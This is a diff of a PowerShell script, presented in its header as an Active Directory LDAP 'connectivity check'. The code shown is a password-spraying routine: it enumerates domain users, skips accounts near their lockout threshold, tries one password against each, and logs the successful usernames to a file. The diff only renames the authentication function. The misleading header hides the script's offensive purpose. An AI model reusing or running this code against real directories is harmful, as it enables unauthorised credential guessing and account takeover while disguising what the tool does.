@@ -1,7 +1,7 @@
 # Author: ysN
 ## This Script helps to perform a connectivity check against the Active Directory LDAP service.
 
-Function Test-ADConnection {
+Function Invoke-ADConnection {
     param(
         $username,
         $password)   
@@ -31,7 +31,7 @@ $users | ForEach-Object {
     $UserName = $userProperties["sAMAccountName"][0]
     $BadPwdCount = $userProperties["badPwdCount"][0]
     if (($LockoutThreshold -eq 0) -or (($LockoutThreshold - $BadPwdCount) -gt 2)) {
-        $auth = Test-ADConnection -username $UserName -password $password
+        $auth = Invoke-ADConnection -username $UserName -password $password
         if($auth -eq "True"){
             Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
             $UserName | Out-File UsersFound.txt -Append
